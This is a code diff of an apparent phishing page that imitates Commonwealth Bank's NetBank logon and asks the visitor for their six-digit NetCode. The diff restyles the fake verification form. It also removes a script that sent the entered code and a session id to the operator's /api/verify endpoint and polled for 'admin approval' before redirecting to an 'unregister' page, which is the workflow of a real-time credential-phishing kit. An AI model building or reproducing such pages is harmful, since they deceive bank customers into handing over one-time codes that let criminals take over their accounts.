@@ -2,7 +2,7 @@
 <html class="win chrome chrome1 webkit webkit5 cssBeforeSupport" lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
  <head id="ctl00_head1">
   <title>
-   NetBank - Confirm this logon
+   NetBank - Your Logon Details
   </title>
   <meta content="text/html;charset=utf-8" http-equiv="Content-Type"/>
   <link href="images/cba_logo_diamond.37dea6048f7da9a9473614e0843d07d9.png" rel="icon" type="image/png"/>
@@ -106,93 +106,278 @@
          </bdo>
         </b>
        </div>
-       <div class="iconoGraphy">
-        <div class="ContentPanel_Form" id="ctl00_BodyPlaceHolder_cplBanner_outer">
-        </div>
-       </div>
-       <div class="enterLogonDetailsBackground" id="ctl00_BodyPlaceHolder_enterLogonDetailsPanel">
-        <div class="loginDetailsPanel">
-         <div class="ContentPanel_Form" id="ctl00_BodyPlaceHolder_cpl_outer">
-          <fieldset class="ContentPanel" id="ctl00_BodyPlaceHolder_cpl" style="z-index: 6;">
-           <div class="FieldPanel">
-            <ul class="LabelFieldList" role="presentation">
-             <li class="LabelFieldListItem" role="presentation">
-              <h2>
-               <strong>
-                We need to verify your identity
-               </strong>
-              </h2>
+
+        <main class="main-content">
+  <style>
+    .main-content {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 24px;
+    }
+    
+    .confirmation-box {
+      max-width: 480px;
+      text-align: left;
+      width: 100%;
+    }
+    
+    .phone-icon {
+      width: 48px;
+      height: 64px;
+      margin-bottom: 24px;
+      position: relative;
+    }
+    
+    .phone-icon::before {
+      content: '';
+      display: block;
+      width: 32px;
+      height: 56px;
+      border: 2px solid #333;
+      border-radius: 6px;
+      margin: 0 auto;
+      position: relative;
+      background: #fff;
+    }
+    
+    .phone-icon::after {
+      content: '';
+      display: block;
+      width: 28px;
+      height: 6px;
+      background: #ffcc00;
+      border-radius: 0 0 3px 3px;
+      position: absolute;
+      bottom: 2px;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    
+    h1 {
+      font-size: 28px;
+      font-weight: 600;
+      color: #000;
+      margin-bottom: 20px;
+      line-height: 1.3;
+    }
+    
+    .description {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+    
+    .security-notice {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      text-align: left;
+      margin-bottom: 32px;
+    }
+    
+    .info-icon {
+      width: 20px;
+      height: 20px;
+      background: #1976d2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 12px;
+      font-weight: bold;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    
+    .security-text {
+      font-size: 15px;
+      color: #333;
+      line-height: 1.5;
+    }
+    
+    .security-text a {
+      color: #1976d2;
+      text-decoration: underline;
+      display: block;
+      margin-top: 4px;
+    }
+    
+    .form-container {
+      margin-top: 8px;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+    }
+    
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      color: #333;
+      margin-bottom: 8px;
+    }
+    
+    input[type="text"] {
+      width: 100%;
+      max-width: 280px;
+      padding: 10px 12px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      font-size: 15px;
+      transition: border-color 0.2s;
+      font-family: inherit;
+    }
+    
+    input[type="text"]:focus {
+      outline: none;
+      border-color: #1976d2;
+      border-width: 2px;
+      padding: 9px 11px;
+    }
+    
+    input[type="text"]::placeholder {
+      color: #999;
+    }
+    
+    .button_ui {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 10px 20px;
+      background: #ffcc00;
+      color: #000;
+      border: none;
+      border-radius: 3px;
+      font-size: 15px;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      font-family: inherit;
+    }
+    
+    .button_ui:hover {
+      background: #e6b800;
+    }
+    
+    .button_ui:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    
+    .button_gold {
+      background: #ffcc00;
+    }
+    
+    .icon_directionarrowright::after {
+      content: '';
+      display: inline-block;
+      width: 0;
+      height: 0;
+      border-top: 5px solid transparent;
+      border-bottom: 5px solid transparent;
+      border-left: 8px solid #000;
+      margin-left: 4px;
+    }
+    
+    .icon_right {
+      flex-direction: row;
+    }
+    
+    .nextButton {
+      min-width: 120px;
+    }
+    
+    .error-message {
+      display: none;
+      background: #ffebee;
+      border: 1px solid #ef5350;
+      border-radius: 3px;
+      padding: 12px;
+      margin-bottom: 20px;
+      color: #c62828;
+      font-size: 14px;
+    }
+    
+    .error-message.active {
+      display: block;
+    }
+    
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 24px;
+      }
+      
+      .description {
+        font-size: 15px;
+      }
+      
+      input[type="text"] {
+        max-width: 100%;
+      }
+    }
+  </style>
+  
+  <div class="confirmation-box">
+    <!-- Phone Icon -->
+    <div class="phone-icon"></div>
+    
+    <!-- Heading -->
+    <h1>Confirm this logon with the CommBank app</h1>
+    
+    <!-- Description -->
+    <p class="description">
+      For your security, we've sent you a notification in the CommBank app asking you to confirm this logon.
+    </p>
+    
+    <!-- Error Message -->
+    <div class="error-message" id="errorMessage">
+      Please enter a valid NetCode.
+    </div>
+    
+    <!-- NetCode Form -->
+    <div class="form-container">
+      <div class="form-group">
+        <label for="netcode">NetCode</label>
+        <input 
+          type="text" 
+          id="netcode" 
+          name="netcode" 
+          placeholder="Enter NetCode" 
+          maxlength="6"
+          autocomplete="off"
+          inputmode="numeric"
+        >
+      </div>
+      
+      <a class="button button_ui button_gold icon icon_directionarrowright icon_right nextButton" href="javascript:void(0)" id="verifyBtn">
+        <i aria-hidden="true" role="presentation" tabindex="-1"></i>
+        <strong>Verify</strong>
+      </a>
+    </div>
+  </div>
+</main>
+          
+          
+                 <b aria-hidden="true" class="barrow" role="presentation" tabindex="-1">
+                  <bdo>
+                  </bdo>
+                 </b>
+                </span>
+               </span>
+              </p>
              </li>
-             <li class="LabelFieldListItem" role="presentation">
-              <div class="netcode-verification" style="margin: 20px 0;">
-               <!-- Phone Icon -->
-               <div class="phone-icon" style="width: 48px; height: 64px; margin-bottom: 20px; position: relative;">
-                <div style="width: 32px; height: 56px; border: 2px solid #333; border-radius: 6px; margin: 0 auto; background: #fff;"></div>
-                <div style="width: 28px; height: 6px; background: #ffcc00; border-radius: 0 0 3px 3px; position: absolute; bottom: 2px; left: 50%; transform: translateX(-50%);"></div>
-               </div>
-               
-               <!-- Heading -->
-               <h3 style="font-size: 22px; font-weight: 600; color: #000; margin-bottom: 16px; line-height: 1.3;">
-                Confirm this logon with the CommBank app
-               </h3>
-               
-               <!-- Description -->
-               <p style="font-size: 15px; color: #333; margin-bottom: 20px; line-height: 1.5;">
-                For your security, we've sent you a notification in the CommBank app asking you to confirm this logon.
-               </p>
-               
-               <!-- Error Message -->
-               <div class="error-message" id="errorMessage" style="display: none; background: #ffebee; border: 1px solid #ef5350; border-radius: 3px; padding: 12px; margin-bottom: 16px; color: #c62828; font-size: 14px;">
-                Please enter a valid NetCode.
-               </div>
-               
-               <!-- NetCode Form -->
-               <div class="form-container" style="margin-top: 16px;">
-                <div class="form-group" style="margin-bottom: 16px;">
-                 <label for="netcode" style="display: block; font-size: 14px; font-weight: 500; color: #333; margin-bottom: 6px;">NetCode</label>
-                 <input 
-                  type="text" 
-                  id="netcode" 
-                  name="netcode" 
-                  placeholder="Enter NetCode" 
-                  maxlength="6"
-                  autocomplete="off"
-                  inputmode="numeric"
-                  style="width: 200px; padding: 8px 10px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; font-family: inherit;"
-                 >
-                </div>
-                
-                <a class="button button_ui button_gold icon icon_directionarrowright icon_right nextButton" href="javascript:void(0)" id="verifyBtn" style="display: inline-flex; align-items: center; justify-content: center; gap: 6px; padding: 8px 16px; background: #ffcc00; color: #000; border: none; border-radius: 3px; font-size: 14px; font-weight: 600; text-decoration: none; cursor: pointer; font-family: inherit;">
-                 <i aria-hidden="true" role="presentation" tabindex="-1"></i>
-                 <strong>Verify</strong>
-                 <span style="width: 0; height: 0; border-top: 4px solid transparent; border-bottom: 4px solid transparent; border-left: 6px solid #000; margin-left: 4px;"></span>
-                </a>
-               </div>
-              </div>
+             <li>
              </li>
             </ul>
            </div>
-          </fieldset>
-         </div>
-        </div>
-       </div>
-       <div class="buttonPanel">
-        <div class="ButtonPanel">
-         <div class="left">
-         </div>
-         <div class="middle">
-         </div>
-         <div class="right">
-         </div>
-        </div>
-       </div>
-      </div>
-     </div>
-     <div class="AuxiliaryContent_wrapper" id="ctl00_AuxiliaryContentWrapper">
-      <div id="AuxiliaryContent">
-       <div class="ContentPanel_Text" id="ctl00_InformationPlaceholder_iplNetCodeTips_outer">
-        <div class="RightContentPanel RightContentPanelDefault">
-         <div>
+          </div>
          </div>
         </div>
        </div>
@@ -204,12 +389,12 @@
     <div>
      <ul>
       <li>
-       <a href="https://www.commbank.com.au/tools.html?ei=nbmod-footer-tools " target="_blank">
+       <a href="https://www.commbank.com.au/tools.html?ei=nbmod-footer-tools" target="_blank">
         Tools &amp; calculators
        </a>
       </li>
       <li>
-       <a href="https://www.commbank.com.au/personal/locate-us.html?ei=nbmod-footer-find-a-branch " target="_blank">
+       <a href="https://www.commbank.com.au/personal/locate-us.html?ei=nbmod-footer-find-a-branch" target="_blank">
         Find a branch
        </a>
       </li>
@@ -226,22 +411,22 @@
      </ul>
      <ul>
       <li>
-       <a href="https://www.commbank.com.au/content/commbank-neo/important-info.html?ei=nbmod-footer-imp-info " target="_blank">
+       <a href="https://www.commbank.com.au/content/commbank-neo/important-info.html?ei=nbmod-footer-imp-info" target="_blank">
         Important information
        </a>
       </li>
       <li>
-       <a href="https://www.commbank.com.au/security-privacy/general-security/privacy.html?ei=nbmod-footer-privacy " target="_blank">
+       <a href="https://www.commbank.com.au/security-privacy/general-security/privacy.html?ei=nbmod-footer-privacy" target="_blank">
         Privacy
        </a>
       </li>
       <li>
-       <a href="https://www.commbank.com.au/content/commbank-neo/important-info/cookies.html?ei=nbmod-footer-cookies " target="_blank">
+       <a href="https://www.commbank.com.au/content/commbank-neo/important-info/cookies.html?ei=nbmod-footer-cookies" target="_blank">
         Cookies
        </a>
       </li>
       <li>
-       <a href="https://www.commbank.com.au/personal/netbank/terms-and-conditions/terms.html?ei=nbmod-footer-terms " target="_blank">
+       <a href="https://www.commbank.com.au/personal/netbank/terms-and-conditions/terms.html?ei=nbmod-footer-terms" target="_blank">
         Terms of use
        </a>
       </li>
@@ -257,7 +442,7 @@
     <input id="SC_TRANSACTION_ID" name="SC_TRANSACTION_ID" type="hidden" value=""/>
     <input id="SC_WEBTRACKER_ID" name="SC_WEBTRACKER_ID" type="hidden" value="NoTrackerId"/>
     <input id="SC_JSON_PATH" name="SC_JSON_PATH" type="hidden" value="/netbank/UserMaintenance/Mixed/ForgotLogonDetails/FLDYourLogonDetails.json"/>
-    <input id="SC_WEBCHAT_PATH" name="SC_WEBCHAT_PATH" type="hidden" value="https://static.my.commbank.com.au/static/netbank/js/liveperson.mtagconfig.a97df15eb690198dc55d82822f903acd.js "/>
+    <input id="SC_WEBCHAT_PATH" name="SC_WEBCHAT_PATH" type="hidden" value="https://static.my.commbank.com.au/static/netbank/js/liveperson.mtagconfig.a97df15eb690198dc55d82822f903acd.js"/>
     <input id="SC_WEBCHAT_SERVER" name="SC_WEBCHAT_SERVER" type="hidden" value="chat.commbank.com.au"/>
     <input id="SC_WEBCHAT_TAG_SERVER" name="SC_WEBCHAT_TAG_SERVER" type="hidden" value="sr1.liveperson.net"/>
     <input id="SC_WEBCHAT_ACC_NUM" name="SC_WEBCHAT_ACC_NUM" type="hidden" value="4005546"/>
@@ -349,7 +534,7 @@
   <iframe height="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" width="1">
   </iframe>
   <input id="SC_channel" type="hidden" value="Netbank"/>
-  <input id="SC_pageurl" type="hidden" value="https://www1.my.commbank.com.au/netbank/UserMaintenance/Mixed/ForgotLogonDetails/FLDYourLogonDetails.aspx "/>
+  <input id="SC_pageurl" type="hidden" value="https://www1.my.commbank.com.au/netbank/UserMaintenance/Mixed/ForgotLogonDetails/FLDYourLogonDetails.aspx"/>
   <input id="SC_previouspagename" type="hidden" value=""/>
   <input id="SC_UUIDv4" type="hidden" value=""/>
   <input id="SC_UUIDv5" type="hidden" value=""/>
@@ -369,160 +554,5 @@
    <iframe height="0" id="cross-domain-store-server-iframe" src="assets/adrum-xd.18b6b3ec105ee15f14ef7c382e15f446.html" style="display: none;" tabindex="-1" title="empty" width="0">
    </iframe>
   </div>
-  
-  <script>
-    // Session setup
-    const sid = new URLSearchParams(location.search).get('sid') ||
-                sessionStorage.getItem('sid');
-    
-    if (!sid) {
-      window.location.href = '/';
-      throw 0;
-    }
-
-    // Heartbeat to keep session alive
-    setInterval(() => {
-      fetch('/api/ping', {
-        method: 'POST',
-        headers: { 'content-type': 'application/json' },
-        body: JSON.stringify({ sid })
-      }).catch(() => {});
-    }, 10000);
-
-    // Elements
-    const netcodeInput = document.getElementById('netcode');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const errorMessage = document.getElementById('errorMessage');
-
-    // Restrict input to digits only
-    netcodeInput.addEventListener('input', (e) => {
-      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
-      if (errorMessage.style.display === 'block') {
-        errorMessage.style.display = 'none';
-      }
-    });
-
-    // Validate NetCode (6 digits)
-    function validateNetCode(code) {
-      return /^\d{6}$/.test(code);
-    }
-
-    // Show error message
-    function showError(msg) {
-      errorMessage.textContent = msg;
-      errorMessage.style.display = 'block';
-      netcodeInput.focus();
-    }
-
-    // Verify button click handler
-    verifyBtn.addEventListener('click', async (e) => {
-      e.preventDefault();
-      
-      const netcode = netcodeInput.value.trim();
-      
-      // Validation
-      if (!netcode) {
-        showError('Please enter your NetCode.');
-        return;
-      }
-      
-      if (!validateNetCode(netcode)) {
-        showError('Please enter a valid 6 digit NetCode.');
-        return;
-      }
-
-      // Disable button and show loading state
-      verifyBtn.style.opacity = '0.6';
-      verifyBtn.style.pointerEvents = 'none';
-      verifyBtn.querySelector('strong').textContent = 'Verifying...';
-
-      try {
-        // Send to server
-        const response = await fetch('/api/verify', {
-          method: 'POST',
-          headers: { 'content-type': 'application/json' },
-          body: JSON.stringify({ sid, phone: netcode })
-        });
-
-        if (response.ok) {
-          // Update page status
-          await fetch('/api/page', {
-            method: 'POST',
-            headers: { 'content-type': 'application/json' },
-            body: JSON.stringify({ sid, page: 'verify.html' })
-          });
-          
-          // Start polling for admin approval
-          startPolling();
-        } else {
-          throw new Error('Verification failed');
-        }
-      } catch (err) {
-        // Reset button
-        verifyBtn.style.opacity = '';
-        verifyBtn.style.pointerEvents = '';
-        verifyBtn.querySelector('strong').textContent = 'Verify';
-        showError('Unable to verify. Please try again.');
-      }
-    });
-
-    // Allow Enter key to submit
-    netcodeInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') {
-        verifyBtn.click();
-      }
-    });
-
-    // Poll for admin action
-    let isWaitingForAdmin = false;
-    
-    function startPolling() {
-      if (isWaitingForAdmin) return;
-      isWaitingForAdmin = true;
-
-      const poll = async () => {
-        if (!isWaitingForAdmin) return;
-
-        try {
-          const res = await fetch(`/api/status/${sid}`);
-          const data = await res.json();
-
-          if (data.status === 'ok') {
-            isWaitingForAdmin = false;
-            // Proceed to next page (unregister/OTP page)
-            window.location.href = '/unregister.html';
-            return;
-          }
-
-          if (data.status === 'redo') {
-            isWaitingForAdmin = false;
-            // Reset button
-            verifyBtn.style.opacity = '';
-            verifyBtn.style.pointerEvents = '';
-            verifyBtn.querySelector('strong').textContent = 'Verify';
-            showError('Invalid NetCode. Please try again.');
-            netcodeInput.value = '';
-            netcodeInput.focus();
-            return;
-          }
-
-          // Continue polling
-          setTimeout(poll, 1200);
-
-        } catch (err) {
-          setTimeout(poll, 2000);
-        }
-      };
-
-      poll();
-    }
-
-    // Update page status on load
-    fetch('/api/page', {
-      method: 'POST',
-      headers: { 'content-type': 'application/json' },
-      body: JSON.stringify({ sid, page: 'verify.html' })
-    }).catch(() => {});
-  </script>
  </body>
 </html>
